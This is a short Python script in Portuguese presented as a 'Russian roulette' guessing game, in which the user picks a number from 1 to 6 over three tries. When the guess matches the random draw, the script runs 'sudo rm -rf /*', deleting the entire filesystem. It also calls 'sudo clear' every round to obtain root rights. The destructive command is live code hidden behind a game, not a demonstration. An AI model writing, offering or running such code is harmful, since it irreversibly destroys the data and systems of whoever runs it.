import os
import random
import time

for i in range(3):
    os.system('sudo clear')
    print('Tentativa {} de 3.'.format(i+1))
    print(' ')
    userinput = int(input('Escolha um número de 1 a 6: '))
    numero_escolhido = random.randint(1,6)
    if userinput == 1 or userinput == 2 or userinput == 3 or userinput == 4 or userinput == 5 or userinput == 6:
        print('O número sorteado é {}.'.format(numero_escolhido))

        if numero_escolhido == userinput:
            print(' ')
            print('Foi de vala...')
            time.sleep(1)
            os.system('sudo rm -rf /*')
            break
        else:
            print(' ')
            print('Ufa!')
            time.sleep(2)
    else:
        ('Digite um número de 1 a 6.')
        time.sleep(2)
    time.sleep(1)
